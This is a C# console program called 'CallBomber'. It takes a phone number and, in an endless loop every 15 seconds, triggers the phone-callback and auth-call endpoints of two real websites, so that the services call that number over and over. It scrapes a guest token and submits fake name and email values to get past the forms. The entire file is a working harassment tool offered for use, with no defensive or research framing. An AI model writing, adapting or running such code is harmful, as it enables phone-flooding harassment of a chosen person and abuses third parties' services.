using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace CallBomber
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Write("Phone: "); // 79991234567
            string phone = Console.ReadLine();

            for (int i = 0; i < int.MaxValue; i++)
            {
                var a = Krkrolik(phone);
                Thread.Sleep(15000);
                var b = Look(phone);
            }
            Console.Read();
        }
        public static async Task Look(string phone)
        {
            // look.online

            HttpClient client = new HttpClient();

            client.DefaultRequestHeaders.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");

            var go = await client.GetStringAsync("https://look.online/auth");

            string token = Between(go, "token\":\"", "\",\"is_guest");

            client.DefaultRequestHeaders.Add("authorization", "Bearer " + token + "");

            StringContent content = new StringContent("{\"phone\":\"" + phone + "\"}", Encoding.UTF8, "application/json");

            var call = await client.PostAsync("https://api.look.online/api/auth-call", content).Result.Content.ReadAsStringAsync();

            if (call.Contains("success"))
            {
                Console.WriteLine("success {+} look.online");
            }
            else
            {
                Console.WriteLine("failed {-} look.online");
            }
        }
        public static async Task Krkrolik(string phone)
        {
            // krkrolik.ru

            HttpClient client = new HttpClient();

            client.DefaultRequestHeaders.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");

            var go = await client.GetStringAsync("https://www.krkrolik.ru/");

            string formattedNumber = $"+{phone.Substring(0, 1)} ({phone.Substring(1, 3)}) {phone.Substring(4, 3)}-{phone.Substring(7, 2)}-{phone.Substring(9)}";

            StringContent content = new StringContent("phone=" + formattedNumber + "&name=23423adf&email=weontuiye" + new Random().Next(0, 99) + "%40gmail.com", Encoding.UTF8, "application/x-www-form-urlencoded");

            var call = await client.PostAsync("https://www.krkrolik.ru/ajax/auth/formcall.php", content).Result.Content.ReadAsStringAsync();

            if (call.Contains("success"))
            {
                Console.WriteLine("success {+} look.online");
            }
            else
            {
                Console.WriteLine("failed {-} look.online");
            }
        }
        static string Between(string source, string left, string right) => Regex.Match(source,string.Format("{0}(.*){1}", left, right)).Groups[1].Value;
    }
}
